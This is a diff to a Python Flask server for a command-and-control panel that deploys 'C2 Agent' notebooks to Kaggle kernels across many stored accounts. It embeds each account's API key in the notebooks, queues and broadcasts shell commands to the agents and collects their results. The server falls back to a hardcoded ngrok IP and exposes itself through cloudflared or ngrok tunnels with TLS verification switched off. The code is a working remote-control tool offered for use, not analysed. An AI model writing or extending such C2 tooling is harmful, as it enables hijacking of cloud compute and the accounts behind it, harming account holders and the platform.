+        if a.get("kaggle_username") == username:
+            account = a
+            break
+    
+    if not account:
+        return jsonify({"kernel_id": kernel_id, "status": "error", "error": "account not found"})
+    
+    api_key = account.get("api_key")
+    
+    # Check kernel status via CLI with credentials
+    import subprocess
+    kernel_slug = f"{username}/c2-agent-{kernel_num}"
+    
+    try:
+        result = subprocess.run(
+            ["kaggle", "kernels", "status", kernel_slug],
+            capture_output=True, text=True, timeout=30,
+            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+        )
+        
+        status = "unknown"
+        if result.returncode == 0:
+            if "COMPLETE" in result.stdout:
+                status = "complete"
+            elif "RUNNING" in result.stdout:
+                status = "running"
+            elif "QUEUED" in result.stdout:
+                status = "queued"
+            elif "ERROR" in result.stdout:
+                status = "error"
+        else:
+            # Kernel might not exist yet
+            status = "not_found"
+        
+        return jsonify({"kernel_id": kernel_id, "status": status, "details": result.stdout[:200] if result.stdout else result.stderr[:200]})
+    except Exception as e:
+        return jsonify({"kernel_id": kernel_id, "status": "error", "error": str(e)})
+
+@app.route("/api/kaggle/kernel/results", methods=["POST"])
+@login_required
+def kaggle_kernel_results():
+    """Get results from kernel execution."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")
+    
+    if not kernel_id:
+        return jsonify({"error": "kernel_id required"}), 400
+    
+    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
+    if len(parts) != 2:
+        return jsonify({"error": "invalid kernel_id format"}), 400
+    
+    username, kernel_num = parts
+    
+    # Get account
+    accounts = account_store.get_all()
+    account = None
+    for a in accounts:
+        if a.get("kaggle_username") == username:
+            account = a
+            break
+    
+    if not account:
+        return jsonify({"error": f"account {username} not found"}), 404
+    
+    api_key = account.get("api_key")
+    
+    # Download kernel output
+    import subprocess
+    import tempfile
+    from pathlib import Path
+    
+    kernel_slug = f"{username}/c2-agent-{kernel_num}"
+    
+    with tempfile.TemporaryDirectory() as tmpdir:
+        try:
+            result = subprocess.run(
+                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
+                capture_output=True, text=True, timeout=60,
+                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+            )
+            
+            if result.returncode != 0:
+                return jsonify({"error": result.stderr[:200]}), 400
+            
+            # Read output files
+            outputs = {}
+            for f in Path(tmpdir).glob("*"):
+                if f.is_file():
+                    try:
+                        outputs[f.name] = f.read_text()[:5000]
+                    except:
+                        outputs[f.name] = "<binary>"
+            
+            return jsonify({"kernel_id": kernel_id, "outputs": outputs})
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+
+@app.route("/api/kaggle/broadcast", methods=["POST"])
+@login_required
+def kaggle_broadcast():
+    """Execute command on ALL Kaggle kernels."""
+    data = request.get_json(silent=True) or {}
+    command = data.get("command")
+    timeout = data.get("timeout", 300)
+    
+    if not command:
+        return jsonify({"error": "command required"}), 400
+    
+    manager = get_kaggle_manager()
+    if not manager or not manager.transports:
+        manager = get_kaggle_manager()
+        manager.load_accounts()
+    
+    if not manager.transports:
+        return jsonify({"error": "No Kaggle accounts loaded"}), 400
+    
+    # Execute on all accounts (5 kernels each)
+    results = []
+    for username, transport in manager.transports.items():
+        try:
+            from kaggle_c2_transport import KaggleMultiKernel
+            api_key = transport.api_key
+            mk = KaggleMultiKernel(username, api_key, None, kernel_count=5)
+            
+            # Execute on all 5 kernels
+            for i in range(1, 6):
+                r = mk.execute_on_kernel(i, command, timeout=timeout)
+                results.append({
+                    "kernel_id": f"kaggle-{username}-agent{i}",
+                    "status": "ok" if r.get("success") else "error",
+                    "output": r.get("output", "")[:100] if r else None
+                })
+        except Exception as e:
+            results.append({"username": username, "status": "error", "error": str(e)})
+    
+    log_event("kaggle_broadcast", f"{len(results)} kernels")
+    return jsonify({"status": "ok", "count": len(results), "results": results})
+
+# ==================== C2 AGENT PERSISTENT CONTROL ====================
+
+# Store for agent checkins and commands
+kaggle_agents_state = {}
+
+@app.route("/api/kaggle/agent/checkin", methods=["POST"])
+def kaggle_agent_checkin():
+    """Agent checkin endpoint - returns pending commands."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")
+    info = data.get("info", {})
+    
+    if not kernel_id:
+        return jsonify({"error": "kernel_id required"}), 400
+    
+    # Update agent state
+    kaggle_agents_state[kernel_id] = {
+        "last_checkin": time.time(),
+        "info": info,
+        "status": "online"
+    }
+    
+    # Get pending commands for this agent
+    commands = []
+    if kernel_id in kaggle_agents_state:
+        commands = kaggle_agents_state[kernel_id].get("pending_commands", [])
+        kaggle_agents_state[kernel_id]["pending_commands"] = []
+    
+    log_event("kaggle_checkin", kernel_id)
+    return jsonify({"status": "ok", "commands": commands})
+
+@app.route("/api/kaggle/agent/result", methods=["POST"])
+def kaggle_agent_result():
+    """Receive command results from agent."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")
+    cmd_id = data.get("cmd_id")
+    result = data.get("result", {})
+    
+    if not kernel_id:
+        return jsonify({"error": "kernel_id required"}), 400
+    
+    # Store result
+    if kernel_id not in kaggle_agents_state:
+        kaggle_agents_state[kernel_id] = {}
+    
+    if "results" not in kaggle_agents_state[kernel_id]:
+        kaggle_agents_state[kernel_id]["results"] = []
+    
+    kaggle_agents_state[kernel_id]["results"].append({
+        "cmd_id": cmd_id,
+        "result": result,
+        "timestamp": time.time()
+    })
+    
+    # Keep only last 100 results
+    kaggle_agents_state[kernel_id]["results"] = kaggle_agents_state[kernel_id]["results"][-100:]
+    
+    log_event("kaggle_result", f"{kernel_id}: {cmd_id}")
+    return jsonify({"status": "ok"})
+
+@app.route("/api/kaggle/agent/queue", methods=["POST"])
+@login_required
+def kaggle_agent_queue():
+    """Queue command for agent to pick up on next checkin."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")
+    cmd_type = data.get("type", "shell")
+    payload = data.get("payload")
+    
+    if not kernel_id or not payload:
+        return jsonify({"error": "kernel_id and payload required"}), 400
+    
+    # Initialize agent state if needed
+    if kernel_id not in kaggle_agents_state:
+        kaggle_agents_state[kernel_id] = {"pending_commands": []}
+    
+    if "pending_commands" not in kaggle_agents_state[kernel_id]:
+        kaggle_agents_state[kernel_id]["pending_commands"] = []
+    
+    # Add command to queue
+    cmd = {
+        "id": f"cmd-{int(time.time())}-{len(kaggle_agents_state[kernel_id]['pending_commands'])}",
+        "type": cmd_type,
+        "payload": payload
+    }
+    kaggle_agents_state[kernel_id]["pending_commands"].append(cmd)
+    
+    log_event("kaggle_queue", f"{kernel_id}: {cmd_type}")
+    return jsonify({"status": "ok", "cmd_id": cmd["id"]})
+
+@app.route("/api/kaggle/agents/status", methods=["GET"])
+@login_required
+def kaggle_agents_status():
+    """Get status of all checked-in agents."""
+    now = time.time()
+    agents = []
+    
+    for kernel_id, state in kaggle_agents_state.items():
+        last_checkin = state.get("last_checkin", 0)
+        status = "online" if now - last_checkin < 120 else "offline"
+        
+        agents.append({
+            "kernel_id": kernel_id,
+            "status": status,
+            "last_checkin": last_checkin,
+            "info": state.get("info", {}),
+            "pending_commands": len(state.get("pending_commands", [])),
+            "results_count": len(state.get("results", []))
+        })
+    
+    return jsonify({"agents": agents, "total": len(agents)})
+
+# Dataset-based C2 (for Kaggle kernels without internet)
+DATASET_COMMANDS_FILE = BASE_DIR / "data" / "dataset_commands.json"
+
+def load_dataset_commands():
+    """Load commands for dataset-based C2."""
+    if DATASET_COMMANDS_FILE.exists():
+        try:
+            return json.loads(DATASET_COMMANDS_FILE.read_text())
+        except:
+            pass
+    return {"commands": [], "last_update": 0, "kernel_targets": {}}
+
+def save_dataset_commands(data):
+    DATASET_COMMANDS_FILE.parent.mkdir(parents=True, exist_ok=True)
+    DATASET_COMMANDS_FILE.write_text(json.dumps(data, indent=2))
+
+@app.route("/api/kaggle/dataset/commands", methods=["GET"])
+@login_required
+def get_dataset_commands():
+    """Get current commands for dataset."""
+    return jsonify(load_dataset_commands())
+
+@app.route("/api/kaggle/dataset/commands", methods=["POST"])
+@login_required
+def add_dataset_command():
+    """Add command to dataset queue."""
+    data = request.get_json(silent=True) or {}
+    cmd_text = data.get("command")
+    target = data.get("target", "all")  # kernel_id or "all"
+    
+    if not cmd_text:
+        return jsonify({"error": "command required"}), 400
+    
+    commands_data = load_dataset_commands()
+    
+    cmd = {
+        "id": f"cmd-{int(time.time())}-{len(commands_data['commands'])}",
+        "command": cmd_text,
+        "target": target,
+        "created": time.time(),
+        "executed": False
+    }
+    
+    commands_data["commands"].append(cmd)
+    commands_data["last_update"] = time.time()
+    save_dataset_commands(commands_data)
+    
+    log_event("dataset_cmd", f"{target}: {cmd_text[:50]}")
+    return jsonify({"status": "ok", "cmd_id": cmd["id"]})
+
+@app.route("/api/kaggle/dataset/commands/<cmd_id>/executed", methods=["POST"])
+@login_required
+def mark_command_executed(cmd_id):
+    """Mark command as executed."""
+    commands_data = load_dataset_commands()
+    
+    for cmd in commands_data["commands"]:
+        if cmd["id"] == cmd_id:
+            cmd["executed"] = True
+            cmd["executed_at"] = time.time()
+            save_dataset_commands(commands_data)
+            return jsonify({"status": "ok"})
+    
+    return jsonify({"error": "command not found"}), 404
+
+@app.route("/api/kaggle/dataset/push", methods=["POST"])
+@login_required
+def push_commands_dataset():
+    """Push commands to Kaggle dataset for a specific account."""
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    api_key = data.get("api_key")
+    dataset_name = data.get("dataset_name", "c2-commands")
+    
+    if not username or not api_key:
+        return jsonify({"error": "username and api_key required"}), 400
+    
+    commands_data = load_dataset_commands()
+    
+    # Create temp dir for dataset
+    with tempfile.TemporaryDirectory() as tmpdir:
+        tmpdir_path = Path(tmpdir)
+        
+        # Write commands file
+        (tmpdir_path / "commands.json").write_text(json.dumps(commands_data, indent=2))
+        
+        # Write dataset metadata
+        metadata = {
+            "title": dataset_name,
+            "id": f"{username}/{dataset_name}",
+            "subtitle": "Command dataset for C2 agents communication",
+            "description": "Commands for C2 agents",
+            "licenses": [{"name": "CC0-1.0"}],
+            "keywords": ["c2"],
+            "data": [{"name": "commands.json", "description": "Commands"}]
+        }
+        (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
+        
+        # Push dataset
+        result = subprocess.run(
+            ["kaggle", "datasets", "create", "-p", tmpdir, "--dir-mode", "zip"],
+            capture_output=True, text=True, timeout=60,
+            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+        )
+        
+        if result.returncode == 0 or "successfully" in result.stdout.lower():
+            log_event("dataset_push", f"{username}/{dataset_name}")
+            return jsonify({"status": "ok", "message": "Dataset created"})
+        else:
+            # Try to update existing dataset
+            result = subprocess.run(
+                ["kaggle", "datasets", "version", "-p", tmpdir, "-m", "Update commands", "--dir-mode", "zip"],
+                capture_output=True, text=True, timeout=60,
+                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+            )
+            
+            if result.returncode == 0 or "successfully" in result.stdout.lower():
+                log_event("dataset_update", f"{username}/{dataset_name}")
+                return jsonify({"status": "ok", "message": "Dataset updated"})
+        
+        return jsonify({"error": result.stderr[:200]}), 500
+
+@app.route("/api/kaggle/kernel/output", methods=["POST"])
+@login_required
+def get_kernel_output():
+    """Get output from a kernel (for dataset-based C2 result collection)."""
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    api_key = data.get("api_key")
+    kernel_slug = data.get("kernel_slug")
+    
+    if not username or not api_key or not kernel_slug:
+        return jsonify({"error": "username, api_key, kernel_slug required"}), 400
+    
+    with tempfile.TemporaryDirectory() as tmpdir:
+        result = subprocess.run(
+            ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
+            capture_output=True, text=True, timeout=120,
+            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+        )
+        
+        output_files = []
+        for f in Path(tmpdir).iterdir():
+            if f.is_file():
+                content = f.read_text(errors='ignore')[:50000]
+                output_files.append({"name": f.name, "content": content})
+        
+        return jsonify({"files": output_files})
+
+# Deploy progress tracking with persistence
+DEPLOY_STATE_FILE = BASE_DIR / "data" / "deploy_state.json"
+
+def load_deploy_state():
+    if DEPLOY_STATE_FILE.exists():
+        try:
+            return json.loads(DEPLOY_STATE_FILE.read_text())
+        except:
+            pass
+    return {"running": False, "total": 0, "deployed": 0, "errors": [], "current_kernel": "", "completed_kernels": []}
+
+def save_deploy_state(state):
+    DEPLOY_STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
+    DEPLOY_STATE_FILE.write_text(json.dumps(state, indent=2))
+
+deploy_progress = load_deploy_state()
+
+@app.route("/api/kaggle/deploy/agent", methods=["POST"])
+@login_required
+def kaggle_deploy_agent():
+    """Deploy persistent C2 agent to all kernels."""
+    global deploy_progress
+    
+    if deploy_progress["running"]:
+        return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
+    
+    data = request.get_json(silent=True) or {}
+    poll_interval = data.get("poll_interval", 30)
+    c2_url = data.get("c2_url")  # Allow custom URL
+    
+    # Get public URL for C2 server
+    if not c2_url:
+        # Try to get public IP
+        try:
+            import urllib.request
+            public_ip = urllib.request.urlopen('https://ifconfig.me', timeout=5).read().decode().strip()
+            c2_url = f"http://{public_ip}:18443"
+        except:
+            c2_url = request.host_url.rstrip('/')
+    
+    # Load agent notebook template
+    notebook_path = Path(__file__).parent / "templates" / "agent_notebook.ipynb"
+    if not notebook_path.exists():
+        return jsonify({"error": "Agent notebook template not found"}), 500
+    
+    notebook_template = notebook_path.read_text()
+    
+    # Get all Kaggle accounts - use validated accounts with kernels access
+    valid_accounts_path = Path(__file__).parent / "data" / "accounts_valid.json"
+    if valid_accounts_path.exists():
+        kaggle_accounts = json.loads(valid_accounts_path.read_text())
+    else:
+        accounts = account_store.get_all()
+        kaggle_accounts = [a for a in accounts if a.get("platform") == "kaggle" and a.get("api_key")]
+    
+    total_kernels = len(kaggle_accounts)  # 1 kernel per account (Kaggle limit: 5 CPU sessions)
+    
+    # Initialize progress
+    deploy_progress = {
+        "running": True,
+        "total": total_kernels,
+        "deployed": 0,
+        "errors": [],
+        "current_kernel": "",
+        "start_time": time.time(),
+        "completed_kernels": [],
+        "c2_url": c2_url
+    }
+    save_deploy_state(deploy_progress)
+    
+    def do_deploy():
+        global deploy_progress, kaggle_agents_state
+        
+        for account in kaggle_accounts:
+            if not deploy_progress["running"]:
+                break
+                
+            username = account.get("kaggle_username")
+            api_key = account.get("api_key_new") or account.get("api_key")
+            log_event("kaggle_deploy", f"{username}: api_key={api_key[:10] if api_key else 'NONE'}... (len={len(api_key) if api_key else 0})")
+            
+            if not username or not api_key:
+                continue
+            
+            # Deploy 1 kernel per account (Kaggle limit: 5 CPU sessions total)
+            kernel_num = 1
+            kernel_id = f"kaggle-{username}-agent{kernel_num}"
+            kernel_slug = f"{username}/c2-agent-{kernel_num}"
+            
+            # Skip already deployed AND checked in
+            if kernel_id in kaggle_agents_state:
+                continue
+            
+            deploy_progress["current_kernel"] = kernel_slug
+            save_deploy_state(deploy_progress)
+            
+            try:
+                # Prepare notebook with config - replace only string values
+                notebook = notebook_template.replace("C2_SERVER_URL", c2_url)
+                # Extract IP from ngrok URL for DNS-free access
+                import socket
+                try:
+                    from urllib.parse import urlparse
+                    host = urlparse(c2_url).netloc
+                    c2_ip = socket.gethostbyname(host)
+                except:
+                    c2_ip = "18.192.31.165"  # Fallback ngrok IP
+                notebook = notebook.replace("C2_SERVER_IP_PLACEHOLDER", c2_ip)
+                notebook = notebook.replace("'KERNEL_ID'", f"'{kernel_id}'")  # Only replace string value
+                notebook = notebook.replace("'API_KEY'", f"'{api_key}'")  # Only replace string value
+                notebook = notebook.replace("'POLL_INTERVAL = 30'", f"'POLL_INTERVAL = {poll_interval}'")
+                
+                # Create temp dir
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    tmpdir_path = Path(tmpdir)
+                    
+                    # Kernel metadata
+                    metadata = {
+                        "id": kernel_slug,
+                        "title": f"C2 Agent {kernel_num}",
+                        "code_file": "notebook.ipynb",
+                        "language": "python",
+                        "kernel_type": "notebook",
+                        "is_private": True,
+                        "enable_gpu": True,
+                        "enable_internet": True
+                    }
+                    (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
+                    (tmpdir_path / "notebook.ipynb").write_text(notebook)
+                    
+                    # Push kernel
+                    result = subprocess.run(
+                        ["kaggle", "kernels", "push", "-p", tmpdir],
+                        capture_output=True, text=True, timeout=60,
+                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+                    )
+                    
+                    if result.returncode == 0 or "successfully" in result.stdout.lower():
+                        # Wait for checkin (up to 300 seconds - Kaggle queue)
+                        checkin_timeout = 300
+                        checkin_start = time.time()
+                        checkin_success = False
+                        
+                        while time.time() - checkin_start < checkin_timeout:
+                            if kernel_id in kaggle_agents_state:
+                                checkin_success = True
+                                break
+                            time.sleep(2)
+                            socketio.emit("deploy_progress", deploy_progress)
+                        
+                        if checkin_success:
+                            deploy_progress["deployed"] += 1
+                            if "completed_kernels" not in deploy_progress:
+                                deploy_progress["completed_kernels"] = []
+                            deploy_progress["completed_kernels"].append(kernel_slug)
+                        else:
+                            deploy_progress["errors"].append(f"{kernel_slug}: checkin timeout after {checkin_timeout}s")
+                    else:
+                        deploy_progress["errors"].append(f"{kernel_slug}: {result.stderr[:100]}")
+                        
+            except Exception as e:
+                deploy_progress["errors"].append(f"{kernel_slug}: {str(e)[:100]}")
+            
+            # Save state after each kernel
+            save_deploy_state(deploy_progress)
+            
+            # Emit progress via socket
+            socketio.emit("deploy_progress", deploy_progress)
+            
+            # Small delay between kernels
+            time.sleep(0.5)
+        
+        deploy_progress["running"] = False
+        deploy_progress["current_kernel"] = ""
+        deploy_progress["end_time"] = time.time()
+        
+        log_event("kaggle_deploy_agent", f"{deploy_progress['deployed']}/{deploy_progress['total']}")
+        socketio.emit("deploy_complete", deploy_progress)
+    
+    # Start deploy in background
+    threading.Thread(target=do_deploy, daemon=True).start()
+    
+    return jsonify({
+        "status": "started",
+        "total": total_kernels,
+        "message": "Deploy started, check progress via WebSocket"
+    })
+
+@app.route("/api/kaggle/deploy/dataset-agent", methods=["POST"])
+@login_required
+def kaggle_deploy_dataset_agent():
+    """Deploy dataset-based C2 agent (for kernels without internet)."""
+    global deploy_progress
+    
+    if deploy_progress["running"]:
+        return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
+    
+    data = request.get_json(silent=True) or {}
+    
+    # Load dataset-based agent notebook template
+    notebook_path = Path(__file__).parent / "templates" / "agent_notebook_dataset.ipynb"
+    if not notebook_path.exists():
+        return jsonify({"error": "Dataset agent notebook template not found"}), 500
+    
+    notebook_template = notebook_path.read_text()
+    
+    # Get all Kaggle accounts
+    valid_accounts_path = Path(__file__).parent / "data" / "accounts_valid.json"
+    if valid_accounts_path.exists():
+        kaggle_accounts = json.loads(valid_accounts_path.read_text())
+    else:
+        accounts = account_store.get_all()
+        kaggle_accounts = [a for a in accounts if a.get("platform") == "kaggle" and a.get("api_key")]
+    
+    total_kernels = len(kaggle_accounts)
+    
+    # Initialize progress
+    deploy_progress = {
+        "running": True,
+        "total": total_kernels,
+        "deployed": 0,
+        "errors": [],
+        "current_kernel": "",
+        "start_time": time.time(),
+        "completed_kernels": [],
+        "mode": "dataset"
+    }
+    save_deploy_state(deploy_progress)
+    
+    def do_deploy_dataset():
+        global deploy_progress, kaggle_agents_state
+        
+        def setup_kaggle_creds(username, api_key):
+            """Setup kaggle.json file - CLI requires this, env vars don't work for write operations."""
+            kaggle_dir = Path.home() / ".kaggle"
+            kaggle_dir.mkdir(parents=True, exist_ok=True)
+            kaggle_json = kaggle_dir / "kaggle.json"
+            kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
+            os.chmod(kaggle_json, 0o600)
+        
+        for account in kaggle_accounts:
+            if not deploy_progress["running"]:
+                break
+                
+            username = account.get("kaggle_username")
+            api_key = account.get("api_key_new") or account.get("api_key")
+            log_event("kaggle_deploy", f"{username}: api_key={api_key[:10] if api_key else 'NONE'}... (len={len(api_key) if api_key else 0})")
+            
+            if not username or not api_key:
+                continue
+            
+            kernel_num = 1
+            kernel_id = f"kaggle-{username}-agent{kernel_num}"
+            kernel_slug = f"{username}/c2-agent-{kernel_num}"
+            
+            if kernel_id in kaggle_agents_state:
+                continue
+            
+            deploy_progress["current_kernel"] = kernel_slug
+            save_deploy_state(deploy_progress)
+            
+            try:
+                # Create commands dataset first
+                dataset_name = "c2-commands"
+                commands_data = load_dataset_commands()
+                dataset_ok = False
+                
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    tmpdir_path = Path(tmpdir)
+                    (tmpdir_path / "commands.json").write_text(json.dumps(commands_data, indent=2))
+                    metadata = {
+                        "title": dataset_name,
+                        "id": f"{username}/{dataset_name}",
+                        "subtitle": "Command dataset for C2 agents communication",
+                        "description": "Commands for C2 agents",
+                        "licenses": [{"name": "CC0-1.0"}],
+                        "keywords": ["c2"],
+                        "data": [{"name": "commands.json", "description": "Commands"}]
+                    }
+                    (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
+                    
+                    # Create dataset
+                    setup_kaggle_creds(username, api_key)
+                    log_event("kaggle_dataset", f"{username}: Creating dataset...")
+                    result = subprocess.run(
+                        ["kaggle", "datasets", "create", "-p", tmpdir, "--dir-mode", "zip"],
+                        capture_output=True, text=True, timeout=60,
+                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+                    )
+                    
+                    log_event("kaggle_dataset", f"{username}: create returncode={result.returncode}")
+                    log_event("kaggle_dataset", f"{username}: stdout={result.stdout[:200] if result.stdout else 'empty'}")
+                    log_event("kaggle_dataset", f"{username}: stderr={result.stderr[:200] if result.stderr else 'empty'}")
+                    
+                    if result.returncode == 0 or "already exists" in result.stderr.lower():
+                        dataset_ok = True
+                    else:
+                        # Try update
+                        log_event("kaggle_dataset", f"{username}: Trying dataset version update...")
+                        result = subprocess.run(
+                            ["kaggle", "datasets", "version", "-p", tmpdir, "-m", "Update commands", "--dir-mode", "zip"],
+                            capture_output=True, text=True, timeout=60,
+                            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+                        )
+                        log_event("kaggle_dataset", f"{username}: version returncode={result.returncode}")
+                        log_event("kaggle_dataset", f"{username}: stdout={result.stdout[:200] if result.stdout else 'empty'}")
+                        log_event("kaggle_dataset", f"{username}: stderr={result.stderr[:200] if result.stderr else 'empty'}")
+                        if result.returncode == 0:
+                            dataset_ok = True
+                
+                if not dataset_ok:
+                    deploy_progress["errors"].append(f"{kernel_slug}: Dataset creation failed")
+                    log_event("kaggle_deploy", f"{kernel_slug}: SKIPPED - dataset failed")
+                    continue
+                
+                # Prepare notebook
+                notebook = notebook_template.replace("'KERNEL_ID'", f"'{kernel_id}'")
+                notebook = notebook.replace("'API_KEY'", f"'{api_key}'")
+                notebook = notebook.replace("'COMMANDS_DATASET'", f"'{username}/c2-commands'")
+                
+                # Create kernel with dataset attached
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    tmpdir_path = Path(tmpdir)
+                    kernel_metadata = {
+                        "id": kernel_slug,
+                        "title": f"C2 Agent {kernel_num}",
+                        "code_file": "notebook.ipynb",
+                        "language": "python",
+                        "kernel_type": "notebook",
+                        "is_private": True,
+                        "dataset_sources": [f"{username}/c2-commands"],
+                        "enable_internet": False
+                    }
+                    (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(kernel_metadata, indent=2))
+                    (tmpdir_path / "notebook.ipynb").write_text(notebook)
+                    
+                    log_event("kaggle_kernel", f"{username}: Pushing kernel...")
+                    setup_kaggle_creds(username, api_key)
+                    result = subprocess.run(
+                        ["kaggle", "kernels", "push", "-p", tmpdir],
+                        capture_output=True, text=True, timeout=60,
+                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+                    )
+                    
+                    log_event("kaggle_kernel", f"{username}: push returncode={result.returncode}")
+                    log_event("kaggle_kernel", f"{username}: stdout={result.stdout[:300] if result.stdout else 'empty'}")
+                    log_event("kaggle_kernel", f"{username}: stderr={result.stderr[:300] if result.stderr else 'empty'}")
+                    
+                    if result.returncode == 0 or "successfully" in result.stdout.lower():
+                        deploy_progress["deployed"] += 1
+                        deploy_progress["completed_kernels"].append(kernel_slug)
+                        kaggle_agents_state[kernel_id] = {
+                            "last_checkin": time.time(),
+                            "info": {"mode": "dataset"},
+                            "pending_commands": [],
+                            "results": []
+                        }
+                        log_event("kaggle_deploy", f"{kernel_slug}: SUCCESS")
+                    else:
+                        error_msg = result.stderr[:200] if result.stderr else result.stdout[:200] if result.stdout else "Unknown error"
+                        deploy_progress["errors"].append(f"{kernel_slug}: {error_msg}")
+                        log_event("kaggle_deploy", f"{kernel_slug}: FAILED - {error_msg}")
+                        
+            except Exception as e:
+                deploy_progress["errors"].append(f"{kernel_slug}: {str(e)[:100]}")
+            
+            save_deploy_state(deploy_progress)
+            socketio.emit("deploy_progress", deploy_progress)
+            time.sleep(0.5)
+        
+        deploy_progress["running"] = False
+        deploy_progress["current_kernel"] = ""
+        deploy_progress["end_time"] = time.time()
+        log_event("kaggle_deploy_dataset", f"{deploy_progress['deployed']}/{deploy_progress['total']}")
+        socketio.emit("deploy_complete", deploy_progress)
+    
+    threading.Thread(target=do_deploy_dataset, daemon=True).start()
+    return jsonify({"message": "Dataset-based deploy started", "status": "started", "total": total_kernels})
+
+@app.route("/api/kaggle/deploy/progress", methods=["GET"])
+@login_required
+def kaggle_deploy_progress():
+    """Get current deploy progress."""
+    return jsonify(deploy_progress)
+
 @app.route("/api/agent/<agent_id>/update", methods=["POST"])
 @login_required
 def update_agent(agent_id):
@@ -882,7 +3488,7 @@ def api_tasks(agent_id):
 CONFIG_KEYS = [
     "webhook_discord", "webhook_telegram", "encryption_key",
     "agent_token", "registration_open",
-    "public_url", "cloudflare_tunnel_token"
+    "public_url", "public_url_kaggle", "cloudflare_tunnel_token"
 ]
 
 @app.route("/api/config", methods=["GET", "POST"])
@@ -894,10 +3500,28 @@ def api_config():
         data = request.get_json(silent=True) or {}
         for k in CONFIG_KEYS:
             if k in data:
-                set_config(k, data[k])
+                v = data[k]
+                if k == "public_url":
+                    v = (v or "").strip()
+                    if v:
+                        from urllib.parse import urlparse
+                        if not (v.startswith("http://") or v.startswith("https://")):
+                            v = "https://" + v
+                        parsed = urlparse(v)
+                        if not parsed.scheme or not parsed.netloc:
+                            return jsonify({"error": "invalid public_url"}), 400
+                        v = v.rstrip("/")
+                set_config(k, v)
         log_event("config_updated", f"keys: {list(data.keys())}")
         return jsonify({"status": "ok"})
     return jsonify({k: get_config(k) for k in CONFIG_KEYS})
+
+@app.route("/api/health")
+def api_health():
+    return jsonify({
+        "status": "ok",
+        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    })
 
 @app.route("/api/webhook/test", methods=["POST"])
 @login_required
@@ -1276,16 +3900,29 @@ threading.Thread(target=scheduled_task_runner, daemon=True).start()
 
 PUBLIC_URL = {"url": ""}
 TUNNEL_LOG = BASE_DIR / "data" / "tunnel.log"
-DEFAULT_LOCAL_DOMAIN = "https://c2panel.rog:8443"
+
+def _default_local_domain():
+    if has_request_context():
+        return f"{request.scheme}://{request.host}"
+    return "https://127.0.0.1:8443"
 
 def _get_public_url():
     u = get_config("public_url", "").strip()
     if u:
-        return u
+        if not (u.startswith("http://") or u.startswith("https://")):
+            u = "https://" + u
+        return u.rstrip("/")
     u = PUBLIC_URL.get("url", "")
     if u:
-        return u
-    return DEFAULT_LOCAL_DOMAIN
+        return (u or "").rstrip("/")
+    return _default_local_domain()
+
+def _get_kaggle_c2_url():
+    """URL for Kaggle agents - prefer public_url_kaggle if Cloudflare is blocked."""
+    u = get_config("public_url_kaggle", "").strip()
+    if u and (u.startswith("http://") or u.startswith("https://")):
+        return u.rstrip("/")
+    return _get_public_url()
 
 @app.route("/api/server/public_url")
 @login_required
@@ -1313,7 +3950,7 @@ def _tunnel_loop(port: int):
 
     for tool_name, cmd, pattern in [
         ("cloudflared",
-         ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate", "--protocol", "http2"],
+         ["cloudflared", "tunnel", "--url", f"https://127.0.0.1:{port}", "--no-autoupdate", "--protocol", "http2", "--no-tls-verify"],
          r'(https://[a-z0-9\-]+\.trycloudflare\.com)'),
         ("ngrok",
          ["ngrok", "http", str(port), "--log", "stdout", "--log-format", "logfmt"],
@@ -1330,9 +3967,7 @@ def _tunnel_loop(port: int):
                         if m:
                             url = m.group(1)
                             PUBLIC_URL["url"] = url
-                            saved = get_config("public_url", "")
-                            if not saved or "trycloudflare.com" in saved or "ngrok" in saved:
-                                set_config("public_url", url)
+                            set_config("public_url", url)  # tunnel always takes priority
                             print(f"[*] PUBLIC TUNNEL ({tool_name}): {url}")
                             log_event("tunnel_up", url)
                             break
@@ -1354,6 +3989,23 @@ def start_tunnel(port: int):
     threading.Thread(target=_tunnel_loop, args=(port,), daemon=True).start()
 
 # ──────────────────────── MAIN ────────────────────────
+
+def _suppress_connection_errors():
+    """Suppress harmless BrokenPipe/SSL errors from Socket.IO transport upgrades."""
+    try:
+        import werkzeug._internal as _wi
+        import werkzeug.serving as _ws
+        _orig_log = _wi._log
+        def _patched_log(type, message, *args, **kwargs):
+            if type == "error" and (
+                "BrokenPipeError" in message or "UNEXPECTED_EOF_WHILE_READING" in message
+            ):
+                return
+            _orig_log(type, message, *args, **kwargs)
+        _wi._log = _patched_log
+        _ws._log = _patched_log  # serving also imports _log directly
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     import argparse
